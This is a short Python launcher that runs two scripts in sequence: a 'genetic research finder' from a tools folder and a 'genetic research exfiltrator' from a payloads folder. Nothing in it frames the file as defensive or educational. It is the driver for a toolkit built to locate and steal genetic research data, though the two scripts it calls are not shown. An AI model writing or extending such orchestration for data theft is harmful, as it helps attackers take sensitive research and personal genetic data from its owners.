import subprocess
import os

def main():
    # Run the genetic research finder
    finder_path = os.path.join(os.path.dirname(__file__), "tools", "genetic_research_finder.py")
    subprocess.run(["python3", finder_path])

    # Run the genetic research exfiltrator
    exfiltrator_path = os.path.join(os.path.dirname(__file__), "payloads", "genetic_research_exfiltrator.py")
    subprocess.run(["python3", exfiltrator_path])

if __name__ == "__main__":
    main()
